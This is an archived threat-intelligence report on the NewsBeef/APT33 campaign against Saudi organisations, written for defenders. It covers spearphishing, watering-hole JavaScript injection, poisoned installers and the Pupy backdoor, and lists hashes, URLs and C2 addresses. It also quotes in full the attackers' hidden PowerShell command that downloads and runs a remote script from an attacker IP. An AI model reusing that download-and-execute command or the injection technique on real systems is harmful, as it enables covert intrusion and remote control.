{
    "id": "9ff1b150-c0b1-4f28-b702-58983a1ee535",
    "created_at": "2022-10-25T16:48:24.375541Z",
    "updated_at": "2025-03-27T02:15:17.29973Z",
    "deleted_at": null,
    "sha1_hash": "04da12e4c212bd727bc80d7fd34b99a99fbc01f0",
    "title": "",
    "authors": "",
    "file_creation_date": "2019-07-05T09:07:01Z",
    "file_modification_date": "2019-07-05T09:07:01Z",
    "file_size": 663928,
    "plain_text": "# ‘Twas the night before\n\n**securelist.com/twas-the-night-before/91599**\n\nBy GReAT\n\nRecently, the United States Cyber Command (USCYBERCOM Malware Alert\n[@CNMF_VirusAlert) highlighted several](https://twitter.com/CNMF_VirusAlert) [VirusTotal uploads of theirs – and the](https://www.virustotal.com/gui/file/28ebfe86217ed36ead5b429cadcd005338a0ae6207119729b53698b5e4a3ef3f/detection)\nexecutable objects relating to 2016 – 2017 NewsBeef/APT33 activity are interesting for a\nvariety of reasons. Before continuing, it’s important to restate yet again that we defend\ncustomers, and research malware and intrusions, regardless of their source.\nAccordingly, subscribers to our [private APT intelligence reports receive unique and](https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting)\nextraordinary data on the significant activity and campaigns of over 100 APTs from all\nover the world, including this 2016-2017 NewsBeef /APT33 activity.\n\nUSCYBERCOM’s VirusTotal executable object uploads appeared in our January 2017\nprivate report “NewsBeef Delivers Christmas Presence”, an examination of a change in\nthe tactics used in spear-phishing and watering hole attacks against Saudi Arabian\ntargets. Two files uploaded by USCYBERCOM are of particular interest. These were first\nseen Dec 2016 and Jan 2017:\n\nMD5: d87663ce6a9fc0e8bc8180937b3566b9, served as\njquerycode-download[.]live/flashplayer23pp_xa_install.exe\njquerycode-download[.]live/chrome_update.exe\nDetected as BSS:Exploit.Win32.Generic, Trojan-Downloader.Win32.Powdr.a, TrojanDownloader.MSIL.Steamilik.zzo\n\nMD5: 9b1a06590b091d300781d8fbee180e75, served as\njquerycode-download[.]live/citrixreceiver.exe\njquerycode-download[.]live/citrixcertificate.exe\nntg-sa[.]com/downloads/citrix_certificate.exe\nDetected as BSS:Exploit.Win32.Generic, Trojan-Downloader.PowerShell.Agent.ah,\nDangerousObject.Multi.Generic\n\nIn order to share insight into Cyber Command’s highlighted malware and its context,\nsome of our private report’s content will be re-written here. The January 2017 report\nfollowed up on other private reports published on the group’s [BeEF-related activity in](https://securelist.com/freezer-paper-around-free-meat/74503/)\n2015 and 2016. All of them cover a thread of mid-2015 activity continuing into 2016, then\nresetting and advancing in 2016 and into 2017. Bear in mind that regardless of current\nleaks, which do not always present exhaustive information on group participants, activity\nfrom the region has had multiple overlaps and presents a confusion of internal\ndynamics…\n\n## NewsBeef Delivers Christmas Presence\n\n_Examination of a change in tactics used in spearphishing and watering hole attacks_\n_against Saudi Arabian targets_\n\n\n-----\n\n### Executive summary\n\nThe NewsBeef APT previously engaged in long-term, elaborate social engineering\nschemes that take advantage of popular social network platforms. Previous analysis of\nthe NewsBeef APT indicates that the group focuses on Saudi Arabian (SA) and Western\ntargets, and lacks advanced offensive technology development capabilities.\n\nIn previous campaigns, NewsBeef relied heavily on its namesake technology, the\nBrowser Exploitation Framework (BeEF). However, in the summer of 2016, the group\ndeployed a new toolset that includes macro-enabled Office documents, PowerSploit, and\nthe Pupy backdoor. The most recent NewsBeef campaign uses this toolset in\nconjunction with spearphishing emails, links sent over social media/standalone private\nmessaging applications, and watering hole attacks that leverage compromised highprofile websites (some belonging to the SA government). The group changed multiple\ncharacteristics year over year – tactics, the malicious JavaScript injection strategically\nplaced on compromised websites, and command and control C2 infrastructure.\n\nIn a nutshell:\n\nThe NewsBeef actor deployed a new toolset in a campaign that focused primarily\non Saudi Arabian targets;\nBeEF does not appear to be deployed as a part of the current campaign;\nCompromised government and infrastructure-related websites are injected with\nJavaScript that geolocates and redirects visitors to spoofed, attacker-controlled\nweb-servers;\nImprovements in JavaScript injection and obfuscation may extend server\npersistence;\nNewsBeef continues to deploy malicious macro-enabled Office documents,\npoisoned legitimate Flash and Chrome installers, PowerSploit, and Pupy tools\n\n### Technical Analysis\n\nThe NewsBeef campaign is divided into two main attack vectors, spearphishing and\nstrategic web compromise (watering hole) attacks. The group’s spearphishing\ncomponent uses malicious, macroenabled, Microsoft Office documents that deliver\nPowerShell scripts. The scripts download poisoned installers (e.g. Flash, Citrix Client,\nand Chrome) from an online presence (in at least one case, the group spoofed a\nlegitimate, well-known IT services organization). Once the installer is downloaded to a\nvictim machine, it runs PowerSploit scripts that in turn download and execute a fullfeatured Pupy backdoor.\n\nOn December 25, 2016, the NewsBeef APT stood up a server to host a new set of\nMicrosoft Office documents (maintaining malicious macros and PowerShell scripts) to\nsupport its spear-phishing operations. The group sent these documents (or links to them)\nto targets via email, and over social network and standalone messaging clients.\n\nTo compromise websites and servers, the group identified vulnerable sites and injected\nobfuscated JavaScript that redirected visitors to NewsBeef-controlled hosts (which\ntracked victims and served malicious content). These compromised servers include\n\n\n-----\n\nSaudi Arabian government servers and other high-value organizational identities\nrelevant to their targets.\n\n### Targets, social engineering, delivery chain\n\nThe majority of NewsBeef targets that our researchers have observed are located in SA.\nTargeting profiles include:\n\nGovernment financial and administrative organizations\nGovernment health organizations\nEngineering and technical organizations\nOne British labor related government organization (targeted multiple times)\n\nThe bulk of the targets were affected through strategic web compromises, especially via\ncompromised government servers. However, Kaspersky Security Network (KSN) records\nalso contain links that victims clicked from the Outlook web client “outlook.live.com” as\nwell as attachments arriving through the Outlook desktop application. This behavior falls\nin line with previous NewsBeef operations, where the group used other standalone\nmessaging clients to send malicious links. Interestingly, NewsBeef set up its server using\nthe hosting provider “Choopa, LLC, US”, the same hosting provider that the group used\nin attacks over the summer of 2016.\n\nThe domain “ntg-sa[.]com” appears to\nbe an attempt by the NewsBeef actor\nto spoof the legitimate Saudi IT\nservices organization, “National\nTechnology Group” (NTG) at,\n“ntg.com[.]sa”. The malicious\ndocuments served at the spoofed\nwebsite are shown below:\n\n\n-----\n\nNTG is a legitimate company that provides IT services and support to SA government\norganizations and communications firms (as well as international financial groups and\nretailers), making it a high-value identity. Spoofing the identity of an IT service provider is\na particularly important asset to threat actors that can abuse the inherent trust of IT\norganizations to push software (which may appear suspicious if served from another\nsource). NTG’s IT focus and client list likely aided NewsBeef’s delivery of malicious\nPowerShell-enabled Office documents and poisoned installers.\n\n\n-----\n\nIn December 2016, the following active URLs were served from the spoofed NTG\nidentity. All of the poisoned installers are technologies that an IT support service may be\nexpected to deliver.\n\nhxxps://ntg-sa[.]com/Downloads/flashplayer23pp_xa_install.exe\nhxxps://ntg-sa[.]com/Downloads/Citrix_Certificate.exe\nhxxps://ntg-sa[.]com/Downloads/Chrome_Update.exe\n\nIn this scenario, the poisoned Flashplayer, Citrix, or Chrome installer drops the file\n“install.bat”. The batch file runs the PowerShell command:\n\npowershell.exe -w hidden -noni -nop -c “iex(New-Object\nSystem.Net.WebClient).DownloadString(‘http://139.59.46[.]154:3485/eiloShaegae1′)\n\nThe command downloads “eiloShaegae1”, another PowerShell downloader script. This\nsecond PowerShell downloader script downloads and runs the payload; a PowerSploit\nReflectivePEInjection script, “hxxp://139.59.46[.]154:3485/IMo8oosieVai”.\n\nThe script maintains and then decodes a base64 string. This base64 string, is the Pupy\nbackdoor DLL, which is loaded and run in-memory, never touching the disk. This Pupy\nbackdoor immediately communicates with 139.59.46[.1]54 over obfs3, posting collected\nsystem data and retrieving commands.\n\nThis selection of “The Threebfuscator” for command and control (C2) communications is\ninteresting, because it is an obfuscating protocol used to mask Tor communications. It is\npossible that the use of obfs3 indicates the attackers’ understanding of its effectiveness\nagainst outbound connection monitoring.\n\nAnother notable spoofed domain used during this campaign is the “maps-modon[.]club”\ndomain. The domain “maps.modon.gov[.]sa” was compromised in December 2016, and\nthe “maps-modon[ ]club” domain created on December 8 2016 The domain shared the\n\n\n-----\n\nsame IP address (45.76.32[.]252) as ntg-sa[.]com . Although we did not observe any\nmalicious documents retrieved from that domain, it is likely that the domain served the\nsame documents as ntg-sa[.]com. The filenames of the malicious Office documents\n(hosted at the spoofed NTG site) are relevant to typical IT and contracting resources and\nindicate that this scheme relies on effective social engineering tactics related to human\nresources and IT activities.\n\nIn other schemes, the attackers sent\nmacro-enabled Office attachments\nfrom spoofed law firm identities (or\nother relevant service providers) to\ntargets in SA. The law firm in this\nscheme is based in the United\nKingdom and is the sole location for\ntargets outside of SA for this campaign.\nBelow is a screenshot of a fake legal\nproposal in Word doc format,\ncontaining malicious macros and\nPowerShell code.\n\nThe malicious document follows the same chain as the poisoned Flash player or Chrome\nInstaller:\n\n\n-----\n\n### Compromised servers and injected JavaScript\n\nStarting in October 2016, NewsBeef compromised a set of legitimate servers (shown\nbelow), and injected JavaScript to redirect visitors to hxxp://analyticsgoogle[.]org:69/Check.aspx:\n\nThe entire list of compromised servers\nis exclusively Saudi Arabian, and\nincludes organizations from the\nfollowing industries:\n\nEnergy services for industrial\nprocesses\nTelecom engineering and\nimplementation services\nShipping and logistics\nMetal engineering and\nmanufacturing\nInformation technology services\nCement and building materials\n\nThese recent attacks against\nlegitimate servers (when compared to previous NewsBeef activity) indicate that\nNewsBeef operators have improved their technical skills, specifically their ability to\ncovertly inject JavaScript code into served web pages. Their injection and obfuscation\ntechniques enable the actor to serve the same JavaScript with every page visit to the\n“watering hole” site as well as increase the difficulty of identifying the malicious\nJavaScript source on compromised sites.\n\nFor example, on a Saudi government website, the NewsBeef APT delivered packed\nJavaScript into the bottom of a referenced script that is included in every page served\nfrom the site (the packed and unpacked JavaScript is shown below). The JavaScript\nforces visiting web browsers to collect and send (via a POST request) web browser,\nbrowser version, country of origin, and IP address data to the attacker controlled server\n“jquerycodedownload[.]live/check.aspx”.\n\nIt is likely that this collection of visitor information represents an attempt to limit the\nnumber of infections to a specific target subset and reduce the attacker’s operational\nfootprint. Although we did not identify injected JavaScript related to the “analyticsgoogle[.]org/check.aspx” redirections, it is likely that it performed similar data collection\n\n\n-----\n\nand exfiltration (via POST). This technique appears to be an improvement over the\nsimple .JPG beaconing which researchers observed in previous NewsBeef watering hole\nattacks. Packed JavaScript:\n\nThe most trafficked of the compromised sites (which redirect to “jquerycodedownload[.]live”) appears to be the government site at “scsb.gov[.]sa/portal/”. A high\nvolume of redirections from the compromised site continues into mid-January 2017.\n\n\n-----\n\nBelow is a list of compromised websites and the associated URL that serves the\ninjected, second layer JavaScript. Note that the JavaScript resource changes on every\ncompromised website among many other referenced JavaScript sources, making it\ndifficult to track down the source of the malicious script per site:\n\n\nwww.taqa.com[.]sa/Scroll-jquery.js\n\n\n-----\n\n199099.gov[.]sa/_LAYOUTS/Yesser.NCC/js/jquery-1.7.2.min.js\n\nMultiple other relevant sites were compromised and redirecting as well.\n\n### The Pupy backdoor\n\nPupy is an open source, multi-platform (Windows, Linux, OSX, Android), multi-function\nbackdoor. The backdoor is mainly written in Python and uses code from other open\nsource attack tools like PowerSploit, Mimikatz, laZagne, etc. Pupy can generate\nbackconnect or bindport payloads in multiple formats: PE executables (x86/x64) for\nWindows, ELF binary/.so for Linux, reflective DLLs (x86/x64), pure Python files,\nPowerShell, apk, and Rubber Ducky script (Windows).\n\nThe malicious DLL deployed by NewsBeef contains Python code, a Python interpreter,\nand the MSVC runtime library as well as code that loads the Python interpreter, runs\nPython code and exports some functions for Python. A configuration string contains\nbase64-encoded Python code (packed with zlib) with transport configuration and\ninformation about C2 server addresses.\n\nWhen initiated, the Python code attempts to retrieve and use SOCKS/HTTP proxy\nsettings from the victim’s computer. The Python code then tries to initiate a reverse\nconnection to the C2 server (139.59.46[.]154:3543) using a TCP protocol with RSA+AES\ntraffic encryption and obfs3 transport using default keys from Pupy sources.\n\n\n-----\n\nAfter a successful connection, NewsBeef Pupy sends information about the infected\ncomputer and waits for commands (which take the form of modules) from the C2 server.\nThe C2 server can send modules with Python code and compiled Python C extensions.\nThe main functionality of the backdoor is implemented in packages (Python code,\ncompiled Python C extensions, compiled executable files) and modules (Python code).\nModules can directly access Python objects on the remote client using the RPyC\nmodule. The Python modules win32com, win32api, and ctypes are used to interact with\nthe Win32 API. Attackers can use standard modules or write their own. All modules are\nexecuted in the memory (a Pupy process can migrate between processes using the\ncorresponding module).\n\n## Conclusion\n\nPrevious reports on the NewsBeef APT noted the group’s reliance on open-source tools\nto launch simple, yet effective attacks. Historically, the group has used BeEF to track\ntargets and deliver malicious payloads. However, as this recent campaign indicates, the\nNewsBeef APT appears to have shifted its intrusion toolset away from BeEF and\ntowards macro-enabled malicious Office documents, PowerSploit, and Pupy. Despite\nthis shift in toolset, the group still relies on old infrastructure as evidenced by their reuse\nof servers hosted by the service providers Choopa and Atlantic.net.\n\nThe improvements in tactics, techniques and procedures appears to have paid off. The\nmost recent campaign indicates that the group was able to compromise a larger number\nof sites including valuable, high-profile SA government identities. However, despite these\nimprovements in technology, the NewsBeef APT continues to rely on social engineering\nschemes and open-source tools – attributes that increase the chances of identification.\n\nNewsBeef attacks against Saudi Arabian organizations and individuals (as well as\ntargets in the European Union) are likely to continue. Additionally, researchers expect\nthat as the group evolves, its tasking will expand to other organizations doing business\nwith, or connected to Saudi Arabian organizations and individuals.\n\nDue to the group’s specific target set, it is crucial that SA security teams, administrators,\nand developers (especially web application administrators/developers) update their\nWordPress, Joomla, and Drupal-based web applications and plugins – as these assets\nare actively scanned and exploited by this APT.\n\n## Appendix\n\n### Related Object MD5 (executable code, malicious office documents, javascript, powershell, etc)\n\nf4d18316e367a80e1005f38445421b1f\n638b74a712a7e45efc9bec126b0f2d87\n45b0e5a457222455384713905f886bd4\n19cea065aa033f5bcfa94a583ae59c08\necfc0275c7a73a9c7775130ebca45b74\n\n\n-----\n\n1b5e33e5a244d2d67d7a09c4ccf16e56\nfa72c068361c05da65bf2117db76aaa8\n43fad2d62bc23ffdc6d301571135222c\nce25f1597836c28cf415394fb350ae93\n03ea9457bf71d51d8109e737158be888\nedfc37461fa66716b53333fd7f841a8e\n623e05dd58d86da76fdfcf9b57032168\n6946836f2feb98d6e8021af6259a02dd\nf4d18316e367a80e1005f38445421b1f\nd87663ce6a9fc0e8bc8180937b3566b9\nf9adf73bf1cdd7cd278e5137d966ddd4\nb8373f909fa228c2b6e7d69f065f30fb\n9b1a06590b091d300781d8fbee180e75\nbcafe408567557289003c79f745f7713\n45b0e5a457222455384713905f886bd4\n83be35956e5d409306a81e88a1dc89fd\nc2165155fcba5b737ee70354b5244be3\n444c93e736194a01bf3b319e3963d746\n0ed61b6f1008000c6dfcd3d842b21971\n3fb33a2747b39a9b1c5c1e41fade595e\nb34fd14105be23480c44cfdf6eb26807\n\n### URLs\n\n**Hosting malicious docs, executables, PowerShell and Pupy backdoors**\n\nmoh.com-ho[.]me/Health_insurance_plan.doc\nmoh.com-ho[.]me/Health_insurance_registration.doc\nmol.com-ho[.]me/cv_itworx.doc\nmci.com-ho[.]me/cv_mci.doc\njquerycode-download[.]live/flashplayer23pp_xa_install.exe\njquerycode-download[.]live/citrixcertificate.exe\njquerycode-download[.]live/chrome_update.exe\njquerycode-download[.]live/CitrixReceiver.exe\njquerycode-download[.]live/check.aspx\njquerycode-download[.]live/CheckLog.aspx\nhttps://ntg-sa[.]com/downloads/citrix_certificate.exe\nhttps://ntg-sa[.]com/Downloads/flashplayer23pp_xa_install.exe\nhttps://ntg-sa[.]com/Downloads/Chrome_Update.exe\nhttp://ntg-sa[.]com/cv.doc\nhttp://ntg-sa[.]com/cv_itworx.doc\nhttp://ntg-sa[.]com/cv_mci.doc\nhttp://ntg-sa[.]com/discount_voucher_codes.xlsm\nhttp://ntg-sa[.]com/Health_insurance_plan.doc\nhttp://ntg-sa[.]com/Health_insurance_registration.doc\nhttp://ntg-sa[.]com/job_titles.doc\nhttp://ntg-sa[.]com/job_titles_itworx.doc\nhttp://ntg-sa[.]com/job_titles_mci.doc\n\n\n-----\n\nhttp://ntg-sa[.]com/Password_Policy.xlsm\n45.32.186.33\nhttp://itworx.com-ho[.]me/*\nhttp://mci.com-ho[.]me/*\nhttp://moh.com-ho[.]me/*\nhttp://mol.com-ho[.]me/*\nhttp://ntg-sa[.]com/*\ntaqa.com[.]sa/arabic/resumes/resume.doc\ntaqa.com[.]sa/arabic/resumes/resume.doc\ntaqa.com[.]sa/arabic/resumes/cv-taqa.doc\ntaqa.com[.]sa/arabic/images/certificate.crt.exe\ntaqa.com[.]sa/arabic/tempdn/cv-taqa.doc\n104.218.120[.]128/pro.bat\n104.218.120[.]128/msservice-a-2.exe\n104.218.120[.]128/msservice-a-4.exe\n104.218.120[.]128/check.aspx\n104.218.120[.]128:69/checkFile.aspx\n139.59.46[.]154/IMo8oosieVai\n139.59.46[.]154:3485/eiloShaegae1\n69.87.223[.]26/IMo8oosieVai\n69.87.223[.]26:8080/eiloShaegae1\n69.87.223[.]26:8080/p\n\n**Additional C2**\n\nanalytics-google[.]org:69/check.aspx\nanalytics-google[.]org/checkFile.aspx\njquerycode-download[.]live/check.aspx\njquerycode-download[.]live/checkFile.aspx\ngo-microstf[.]com/checkFile.aspx\n104.218.120[.]128/check.aspx\n104.218.120[.]128:69/checkFile.aspx\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2019/2019.07.04.NewsBeef_APT/Twas%20the%20night%20before.pdf"
    ],
    "report_names": [
        "Twas the night before"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e034b94b-9655-42c4-a72e-a58807dce299",
            "created_at": "2022-10-25T16:07:24.133537Z",
            "updated_at": "2025-03-27T02:02:10.118581Z",
            "deleted_at": null,
            "main_name": "Rocket Kitten",
            "aliases": [
                "Group 83",
                "NewsBeef",
                "Newscaster",
                "Operation Newscaster",
                "Operation Woolen-GoldFish",
                "Parastoo",
                "Rocket Kitten"
            ],
            "source_name": "ETDA:Rocket Kitten",
            "tools": [
                "CoreImpact (Modified)",
                "FireMalv",
                "Ghole",
                "Gholee"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b23e717c-0b27-47e0-b3c8-4defe6dd857f",
            "created_at": "2023-01-06T13:46:38.367369Z",
            "updated_at": "2025-03-27T02:00:02.815758Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "ATK35",
                "Peach Sandstorm",
                "TA451",
                "APT 33",
                "Elfin",
                "Refined Kitten",
                "MAGNALLIUM",
                "HOLMIUM",
                "COBALT TRINITY",
                "G0064"
            ],
            "source_name": "MISPGALAXY:APT33",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9fe49a5b-f3e6-4fbf-99a1-db15dad460c3",
            "created_at": "2024-05-01T02:03:08.045004Z",
            "updated_at": "2025-03-27T02:05:17.325038Z",
            "deleted_at": null,
            "main_name": "COBALT TRINITY",
            "aliases": [
                "Elfin ",
                "HOLMIUM ",
                "MAGNALIUM ",
                "Peach Sandstorm ",
                "Refined Kitten ",
                "TA451 ",
                "APT33 "
            ],
            "source_name": "Secureworks:COBALT TRINITY",
            "tools": [
                " Cadlotcorg",
                " Dello RAT",
                " Imminent Monitor",
                " KDALogger",
                " Koadic",
                " NanoCore",
                " NetWire",
                " POWERTON",
                " PoshC2",
                " Poylog",
                " PupyRAT",
                " Schoolbag",
                "AutoCore"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "029625d2-9734-44f9-9e10-b894b4f57f08",
            "created_at": "2023-01-06T13:46:38.364105Z",
            "updated_at": "2025-03-27T02:00:02.815023Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Parastoo",
                "iKittens",
                "Group 83",
                "NewsBeef",
                "G0058",
                "CharmingCypress"
            ],
            "source_name": "MISPGALAXY:Charming Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
            "created_at": "2024-05-01T02:03:08.027871Z",
            "updated_at": "2025-03-27T02:05:17.313679Z",
            "deleted_at": null,
            "main_name": "COBALT ILLUSION",
            "aliases": [
                "APT42 ",
                "Charming Kitten ",
                "CharmingCypress ",
                "ITG18 ",
                "Magic Hound ",
                "Mint Sandstorm sub-group ",
                "NewsBeef ",
                "Newscaster ",
                "PHOSPHORUS sub-group ",
                "TA453 ",
                "UNC788 ",
                "Yellow Garuda ",
                "APT35 "
            ],
            "source_name": "Secureworks:COBALT ILLUSION",
            "tools": [
                " MagicHound Toolset",
                " PupyRAT",
                "Browser Exploitation Framework (BeEF)"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e5ff825b-0456-4013-b90a-971b93def74a",
            "created_at": "2022-10-25T15:50:23.824058Z",
            "updated_at": "2025-03-27T02:00:55.553346Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "APT33",
                "HOLMIUM",
                "Elfin",
                "Peach Sandstorm"
            ],
            "source_name": "MITRE:APT33",
            "tools": [
                "PowerSploit",
                "AutoIt backdoor",
                "PoshC2",
                "Mimikatz",
                "NanoCore",
                "DEADWOOD",
                "StoneDrill",
                "POWERTON",
                "LaZagne",
                "TURNEDUP",
                "NETWIRE",
                "Pupy",
                "ftp",
                "Shamoon"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041717,
    "ts_creation_date": 1562317621,
    "ts_modification_date": 1562317621,
    "files": {
        "pdf": "https://archive.orkl.eu/04da12e4c212bd727bc80d7fd34b99a99fbc01f0.pdf",
        "text": "https://archive.orkl.eu/04da12e4c212bd727bc80d7fd34b99a99fbc01f0.txt",
        "img": "https://archive.orkl.eu/04da12e4c212bd727bc80d7fd34b99a99fbc01f0.jpg"
    }
}